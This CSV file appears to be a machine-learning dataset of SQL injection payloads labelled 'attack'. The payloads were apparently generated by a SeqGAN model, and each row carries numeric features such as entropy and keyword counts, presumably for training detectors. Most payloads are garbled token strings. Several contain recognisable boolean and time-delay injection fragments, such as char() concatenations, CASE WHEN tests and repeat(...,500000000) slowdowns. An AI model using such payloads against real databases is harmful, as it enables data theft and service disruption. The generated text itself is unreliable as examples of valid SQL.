label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '   o where where and 2961 _ 5485   select or 8691exppeor t  (ep_s    h  (  =    = and   =  4799,char  (  ,500000000  (  5485  =    ll_s reosytr goynt_us and    (  =  cbl_,ainsdoltsuom.bjss asi.tas ds rdesus as tl  = and  ,p_tounft1,rs ab",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231,613.0,42.0,3.8220992120710138,207.0,77.0,252.0,77.0,0.3376835236541599,0.12561174551386622,0.4110929853181077,0.12561174551386622,2.0,0.0,0.0,0.0,0.0,8.0,0.0,43.0,0.0,6.0,6.0,18.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,2.0,0.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,0.0,26.0
attack,"1""    84467440737095516106849 when  (  )    *    =    (  ||or  uunss as 8571(  =   )      m48yp_ _uringelleffnsbcsust3upalluns where 3352  (    (  (  (  (  3484   (  = where and or 9643  +char  (  (  100  =   (   )    =  ||(  ,s chpe',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'la,alldbge$cs imn.,a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232,329.0,45.0,4.127194562559329,103.0,56.0,124.0,46.0,0.3130699088145897,0.1702127659574468,0.3768996960486322,0.1398176291793313,2.0,1.0,0.0,1.0,1.0,5.0,0.0,23.0,0.0,2.0,4.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"ncngu,'  =  'lomas ay t  =  = ypp  =   (  = from     char  )    (  (  ,and gchar  (  +char  selectt_--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233,102.0,26.0,3.62680425717706,43.0,0.0,41.0,18.0,0.4215686274509804,0.0,0.4019607843137255,0.17647058823529413,2.0,0.0,2.0,0.0,0.0,5.0,0.0,5.0,0.0,1.0,2.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,4.0
attack,"1""   t*   )      (  (  (     2774  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234,40.0,12.0,2.200645788724073,1.0,5.0,25.0,9.0,0.025,0.125,0.625,0.225,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1-%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'q'  =  '""  =  ""sb$co,ain.sbs a,serinb$fg'  =  'y""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235,297.0,42.0,4.009585069075991,95.0,29.0,113.0,60.0,0.31986531986531985,0.09764309764309764,0.38047138047138046,0.20202020202020202,6.0,4.0,1.0,0.0,0.0,5.0,0.0,22.0,1.0,2.0,6.0,16.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1un.im_s select or t1,q,ablgysinges ctt  r  (   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236,50.0,23.0,4.1076834836312495,30.0,2.0,11.0,7.0,0.6,0.04,0.22,0.14,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,2.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"46388)    )   twhere a,ploles 9643efras c f'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'al_t2t  (  (  =  )   6503 and a122  (  2724  3455  (  117  (  (  select and et  (  (  =    (  =  (  )    )   or 3  100  ,   o,b$cdo aolab$aldtere/sedt2n",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237,253.0,39.0,3.998414208129008,81.0,45.0,96.0,31.0,0.3201581027667984,0.17786561264822134,0.3794466403162055,0.1225296442687747,2.0,0.0,0.0,1.0,0.0,5.0,0.0,17.0,0.0,1.0,3.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,1%01%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238,12.0,6.0,2.4182958340544896,0.0,3.0,4.0,5.0,0.0,0.25,0.3333333333333333,0.4166666666666667,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%%%""  =  ""'  =  'u   )    rt  (  ""dskh""  +char  4165char  (  char  (  9354(rup_gll_u.tefing  (  8403  (  (  (  111  hchar  (  0x78  char  ||char  (  )   s ex  122  ,(_(  (   =    (  (  (  (  (  )     ,--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239,204.0,40.0,3.689790168403198,49.0,22.0,89.0,44.0,0.24019607843137256,0.10784313725490197,0.4362745098039216,0.21568627450980393,2.0,4.0,2.0,0.0,0.0,3.0,0.0,21.0,3.0,3.0,2.0,8.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,4.0
attack,"1'   = where   s like  3038  (   ||char  (  (  65  (  =  (  and 8446744073709551610,re  (  _ and    (  (  )    (  (  (  (  )    )    (  ||char  83  )    (  ||char  (  88  ,null  (    (  s t  (    (  3455  (    (  (  (  (  99  (  =  rdbst_us aonin.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240,247.0,34.0,3.376722106157609,48.0,36.0,119.0,44.0,0.19433198380566802,0.145748987854251,0.4817813765182186,0.17813765182186234,1.0,0.0,0.0,0.0,0.0,3.0,0.0,29.0,0.0,2.0,2.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,6.0
attack,"1""  )    2961 adnpt_uoluntlll_uedb$,char  ungwmf)   asublubmt1dtas alyeft  hessabl_usystdp  clinyms  m.rs ab$ablpeaing,di.rdmaunrgelb$suggyt  1087 or colasktamt_s  t3urintinpet1ins ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241,181.0,36.0,4.594170366184631,128.0,12.0,27.0,14.0,0.7071823204419889,0.06629834254143646,0.14917127071823205,0.07734806629834254,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0
attack,S'  = and 8673cl_ a tepg_usa.sioant$luge,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242,40.0,24.0,4.3341837197791895,24.0,4.0,6.0,6.0,0.6,0.1,0.15,0.15,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243,75.0,15.0,2.4991551408376407,6.0,13.0,44.0,12.0,0.08,0.17333333333333334,0.5866666666666667,0.16,2.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'r 7522 6849 cl_ulunt_um.s as ab$gt1,kpsinmb$g  l_unds t1,s orypfs atedng",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244,74.0,33.0,4.689135886385465,44.0,11.0,10.0,9.0,0.5945945945945946,0.14864864864864866,0.13513513513513514,0.12162162162162163,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )     4165)    )   alung_um.teft1,egh"" like ""ou  ( t  79  (  =  =   where xpe(  (1  3862  (  from,sus ums axf,ab,2649   b$t3,s t1,t_3lulluesellic,in.inbn,eguteb$foupals asunetsautdo  from ap t3+  (  =  ,500000000      (  )  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245,230.0,41.0,4.398083752258823,99.0,30.0,67.0,34.0,0.43043478260869567,0.13043478260869565,0.29130434782608694,0.14782608695652175,0.0,3.0,0.0,0.0,0.0,3.0,0.0,12.0,0.0,2.0,9.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1r6588 t3   )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246,18.0,10.0,2.855953642864355,2.0,6.0,7.0,3.0,0.1111111111111111,0.3333333333333333,0.3888888888888889,0.16666666666666666,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-case'  )   or   (  2301  =  7504  )  *7504 and   (  't  49   fromstas     t  =    (  (  =  =      and rup_usunty ainstastiomtab$co asys ass 'unusual'rl1mng'  )    (  =  (     (   (  =    (  +char  (  2724    (  (  (    (  )  (  (  (  (  ((  ||char  *  )    = 7793 char  113  (  * wheree  (/  )    =   (er2    (  (  113  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247,321.0,40.0,3.5159057537508733,86.0,30.0,151.0,54.0,0.26791277258566976,0.09345794392523364,0.470404984423676,0.16822429906542055,5.0,0.0,1.0,1.0,3.0,8.0,0.0,31.0,0.0,1.0,0.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,6.0
attack,"48731'   and    )    =%at  )      (  (  ,)pp _in,rs mes Nfinpincd.sioun.si charys is ypefs t1,s char  ,,airg_lf1 where r  (  (  117  )  )          (  =  ,,0    (  =  (  8403122  (  (  char  (  8459500000000  (  (  (  (    (  (  k t  ("" concat  69p_us sins",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248,255.0,41.0,3.8925240712816422,80.0,33.0,102.0,40.0,0.3137254901960784,0.12941176470588237,0.4,0.1568627450980392,1.0,1.0,0.0,0.0,0.0,3.0,0.0,22.0,1.0,3.0,7.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,5.0
attack,  83  (  ||char  (  = or and 121 l_uinins ou    (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249,53.0,21.0,3.5062517586635598,18.0,5.0,21.0,9.0,0.33962264150943394,0.09433962264150944,0.39622641509433965,0.16981132075471697,0.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0
attack,1121'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250,11.0,5.0,2.1180782093497093,0.0,4.0,4.0,3.0,0.0,0.36363636363636365,0.36363636363636365,0.2727272727272727,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1) wherey  6388suptexp  ( _(  ,null  from and or t  (  (  +  (   122  (  )   (  ((  (  =   or from where ainup_s oblbeget  (  (  (  (  (  (  122i  (  , 1570  85  (   (  113  =  ||anas ab$hecsnb_sinlnoles t2bgus tc alasildblb$fgs ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251,229.0,38.0,4.037764891358563,94.0,21.0,81.0,33.0,0.4104803493449782,0.09170305676855896,0.3537117903930131,0.14410480349344978,0.0,0.0,0.0,0.0,0.0,2.0,0.0,21.0,0.0,3.0,2.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,-%890480,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252,8.0,6.0,2.5,0.0,6.0,0.0,2.0,0.0,0.75,0.0,0.25,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ' aom'  =  'glh,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253,209.0,35.0,3.746472074453072,62.0,26.0,85.0,36.0,0.2966507177033493,0.12440191387559808,0.40669856459330145,0.1722488038277512,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,1.0,1.0,4.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,7.0
attack,"1""  (  =      )     )   from concat      (  (  3484pex  ( likep_s asw asys t3us as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254,82.0,28.0,3.5084413332003987,31.0,6.0,36.0,9.0,0.3780487804878049,0.07317073170731707,0.43902439024390244,0.10975609756097561,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255,349.0,41.0,3.643221893043814,107.0,35.0,154.0,53.0,0.30659025787965616,0.10028653295128939,0.44126074498567336,0.1518624641833811,0.0,2.0,0.0,0.0,0.0,1.0,0.0,34.0,0.0,2.0,4.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,10.0
attack,"1%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '0x717a767a71' or '$asmab$ullet  (ypea  (p_un.nnull  ""yobb"" char    )  100  (  (    (  4799   us or   from where 8571  97  (     rie3352 e67  (  (  ,500000000perwhere   )    (  (  (  )    (  4018    ) _,ainsd.ati..tom.udoluntchar  ( or cs wherem.tconcat     )    (  (  (  (  (  (  (    (83",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256,488.0,44.0,4.237294706767138,192.0,63.0,167.0,66.0,0.39344262295081966,0.1290983606557377,0.3422131147540984,0.13524590163934427,4.0,4.0,0.0,0.0,1.0,3.0,0.0,34.0,3.0,2.0,4.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,2.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'm'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257,249.0,38.0,3.7780084260186326,75.0,29.0,100.0,45.0,0.30120481927710846,0.11646586345381527,0.40160642570281124,0.18072289156626506,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%'+  (  select 'aous use_itesykt_unsyt3,asesy,ys fgchar char  (  char  =  (  (  ||charchar  (  (  8459  500000000p  (  (  )  (  (  g'    (  ||char  (  =   from attt1,ept_m.t  (   from a, qwherey andend    =   =    r epexp_unt_teget(  (  (  +char  8571   )   where t3/p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258,269.0,42.0,4.154247085252853,116.0,21.0,89.0,43.0,0.4312267657992565,0.07806691449814127,0.3308550185873606,0.15985130111524162,3.0,0.0,0.0,1.0,0.0,4.0,0.0,18.0,1.0,5.0,4.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,8.0
attack,"1t'   char  (  49   = or or 1570  =  from texp_lll_engf where t  (  (  (  (   (  +char  )    (  (  (  (  ,ag'  =9575  (  (  ,  (  6503 6849  (  (  (  88  (  *  (  (  (  (   r 2961y",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259,180.0,35.0,3.416081977631651,38.0,25.0,84.0,33.0,0.2111111111111111,0.1388888888888889,0.4666666666666667,0.18333333333333332,2.0,0.0,0.0,0.0,1.0,3.0,0.0,22.0,0.0,2.0,2.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,6.0
